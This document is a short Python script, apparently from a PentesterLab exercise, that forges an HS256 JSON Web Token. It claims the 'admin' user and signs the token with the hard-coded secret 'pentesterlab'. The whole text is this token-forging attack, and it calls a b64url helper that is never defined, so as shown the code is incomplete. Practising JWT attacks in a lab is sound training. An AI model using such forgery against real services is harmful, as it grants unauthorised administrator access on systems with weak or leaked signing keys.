import json, base64, hmac, hashlib

secret = b"pentesterlab"

header = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "admin"}

h64 = b64url(json.dumps(header, separators=(",", ":")).encode())
p64 = b64url(json.dumps(payload, separators=(",", ":")).encode())

msg = f"{h64}.{p64}".encode()
sig = hmac.new(secret, msg, hashlib.sha256).digest()
s64 = b64url(sig)

token = f"{h64}.{p64}.{s64}"
print(token)
